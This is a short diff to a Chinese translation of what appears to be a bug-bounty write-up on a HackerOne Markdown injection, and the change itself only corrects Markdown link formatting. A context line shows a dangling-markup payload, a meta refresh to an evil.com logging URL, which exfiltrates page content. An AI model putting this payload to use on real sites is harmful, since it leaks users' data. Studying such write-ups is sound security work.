@@ -102,7 +102,7 @@ URL：hackerone.com
 <meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=
 ```
 瀏覽器會提交兩個引號之間的任何東西。<br />
-現在，結果是，這個已經在 HackerOne 的 [https://hackerone.com/reports/110578](#110578)報告中由 [https://hackerone.com/intidc](intidc) 公開。<p>
+現在，結果是，這個已經在 HackerOne 的 [#110578](https://hackerone.com/reports/110578)報告中由 [intidc](https://hackerone.com/intidc) 公開。<p>
 
 看到它公開之後，我有一點失望。<br />
 根據 HackerOne，它們依賴於 Redcarpet（一個用於 Markdown 處理的 Ruby 庫）的實現，<br />
